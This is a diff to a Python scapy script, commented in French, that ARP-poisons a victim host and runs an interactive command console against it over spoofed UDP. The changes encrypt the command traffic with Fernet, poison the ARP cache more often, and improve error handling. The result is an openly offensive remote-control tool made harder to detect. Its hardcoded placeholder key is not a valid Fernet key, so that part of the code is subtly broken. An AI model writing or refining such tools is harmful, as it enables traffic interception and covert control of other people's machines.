@@ -5,6 +5,7 @@ import socket
 import threading
 import time
 from logging import getLogger, ERROR
+from cryptography.fernet import Fernet
 
 getLogger('scapy.runtime').setLevel(ERROR)
 
@@ -13,6 +14,10 @@ try:
 except ImportError:
     print('[!] Scapy Installation Not Found')
     sys.exit(1)
+
+# Génération ou clé partagée pour le chiffrement
+SECRET_KEY = b'some_shared_secret_key_32bytes'
+cipher = Fernet(SECRET_KEY)
 
 try:
     victimIP = input('[*] Enter Victim IP: ')
@@ -25,53 +30,83 @@ except KeyboardInterrupt:
 conf.verb = 0
 
 def getMAC():
+    """Récupère l'adresse MAC de la victime."""
     try:
-        pkt = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=victimIP), timeout=2, iface=IF, inter=0.1)
-    except Exception:
-        print('[!] Failed to Resolve Victim MAC Address')
+        pkt = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=victimIP), timeout=2, iface=IF, inter=0.1, verbose=0)
+        for snd, rcv in pkt[0]:
+            return rcv.sprintf(r"%Ether.src%")
+    except Exception as e:
+        print(f'[!] Failed to Resolve Victim MAC Address: {e}')
         sys.exit(1)
-    for snd, rcv in pkt[0]:
-        return rcv.sprintf(r"%Ether.src%")
 
-print('\n[*] Resolving Victim MAC Address... ')
+print('\n[*] Resolving Victim MAC Address...')
 victimMAC = getMAC()
 
 spoofStatus = True
 
 def poison():
-    while True:
-        if not spoofStatus:
-            break
-        send(ARP(op=2, pdst=victimIP, psrc=spoofIP, hwdst=victimMAC))
-        time.sleep(5)
+    """Effectue un empoisonnement ARP continu."""
+    while spoofStatus:
+        try:
+            send(ARP(op=2, pdst=victimIP, psrc=spoofIP, hwdst=victimMAC), verbose=0)
+            time.sleep(2)  # Optimisation: réduit l'intervalle
+        except Exception as e:
+            print(f'[!] Error in ARP Poisoning: {e}')
 
 print('\n[*] Starting Spoofer Thread...')
-thread = []
 try:
-    poisonerThread = threading.Thread(target=poison)
-    thread.append(poisonerThread)
+    poisonerThread = threading.Thread(target=poison, daemon=True)
     poisonerThread.start()
     print('[*] Thread Started Successfully\n')
-except Exception:
-    print('[!] Failed to Start Thread')
+except Exception as e:
+    print(f'[!] Failed to Start Thread: {e}')
     sys.exit(1)
 
 print('[*] Initializing Interaction With Victim...')
-pkt1 = sr1(IP(dst=victimIP, src=spoofIP) / UDP(sport=80, dport=80) / Raw(load='hello victim'))
-pkt2 = sr1(IP(dst=victimIP, src=spoofIP) / UDP(sport=80, dport=80) / Raw(load='report'))
 
-prompt = pkt2.getlayer(Raw).load
+def send_command(command):
+    """Envoie une commande chiffrée et reçoit une réponse."""
+    try:
+        encrypted_command = cipher.encrypt(command.encode())
+        response = sr1(IP(dst=victimIP, src=spoofIP) / UDP(sport=80, dport=80) / Raw(load=encrypted_command), timeout=3, verbose=0)
+        if response and response.haslayer(Raw):
+            decrypted_response = cipher.decrypt(response.getlayer(Raw).load).decode()
+            return decrypted_response
+        else:
+            return "[!] No response from victim."
+    except Exception as e:
+        return f"[!] Error while sending command: {e}"
 
-print('[*] Initialization Complete')
-print('[*] Enter "goodbye" to Stop Interaction\n')
+# Envoi des messages initiaux
+try:
+    send_command("hello victim")
+    prompt = send_command("report")
+    print('[*] Initialization Complete')
+    print('[*] Enter "goodbye" to Stop Interaction\n')
+except Exception as e:
+    print(f'[!] Initialization Failed: {e}')
+    spoofStatus = False
+    sys.exit(1)
 
-while True:
-    command = input(prompt)
-    sendcom = sr1(IP(dst=victimIP, src=spoofIP) / UDP(sport=80, dport=80) / Raw(load=command))
-    output = sendcom.getlayer(Raw).load
-    if command.strip() == 'goodbye':
-        print('\nGrabbing Threads...')
-        spoofStatus = False
-        poisonerThread.join()
-        sys.exit(1)
-    print(output)
+# Interaction avec la victime
+try:
+    while True:
+        command = input(prompt or "> ")
+        if command.strip() == "goodbye":
+            print('\nGrabbing Threads...')
+            spoofStatus = False
+            poisonerThread.join()
+            print("[*] Interaction Terminated.")
+            sys.exit(0)
+        output = send_command(command)
+        print(output)
+except KeyboardInterrupt:
+    print('\n[!] User Interrupted. Exiting...')
+    spoofStatus = False
+    poisonerThread.join()
+    sys.exit(1)
+except Exception as e:
+    print(f'[!] Unexpected Error: {e}')
+    spoofStatus = False
+    poisonerThread.join()
+    sys.exit(1)
